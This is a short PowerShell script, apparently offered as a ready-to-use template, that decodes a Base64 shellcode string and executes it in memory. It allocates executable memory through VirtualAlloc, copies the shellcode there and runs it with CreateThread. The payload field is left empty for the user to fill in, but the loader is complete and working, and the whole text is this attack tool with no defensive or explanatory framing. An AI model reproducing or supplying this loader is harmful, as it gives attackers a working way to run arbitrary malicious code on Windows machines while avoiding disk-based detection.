# Base64-encoded shellcode (replace with your actual Base64-encoded shellcode)
$base64Shellcode = ""

# Decode Base64 shellcode to byte array
$shellcode = [System.Convert]::FromBase64String($base64Shellcode)

# Define P/Invoke signatures for Windows API calls
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@

# Allocate memory for shellcode
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40
$shellcodeSize = $shellcode.Length
$mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellcodeSize, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)

# Copy shellcode to allocated memory
[Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcodeSize)

# Create thread to execute shellcode
$threadId = 0
$threadHandle = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [Ref] $threadId)

# Wait for thread to complete
[Win32]::WaitForSingleObject($threadHandle, 0xFFFFFFFF)